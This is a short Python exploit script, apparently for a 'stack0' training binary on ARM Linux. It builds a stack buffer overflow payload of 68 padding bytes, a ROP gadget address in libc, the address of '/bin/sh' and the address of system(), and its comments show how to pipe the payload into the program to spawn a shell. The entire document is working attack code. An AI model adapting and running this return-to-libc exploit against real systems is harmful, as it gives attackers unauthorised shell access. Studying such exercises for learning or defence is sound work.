# python stack0.py > stack0_exploit
# cat stack0_exploit - | ./stack0
import struct
payload  = 'A' * 68  #overflow buffer
#payload +='BBBB'
payload += struct.pack("<I", 0xB6F52D5C)#rop gadget (pop r0,r5,pc) in /lib/arm-linux-gnueabihf/libc-2.19.so
payload += struct.pack("<I", 0xb6fc4304)#r0=addr of /bin/sh
payload += 'DDDD'
payload += struct.pack("<I", 0xb6f28bc5)#address of __libc_system (or system)
print(payload)
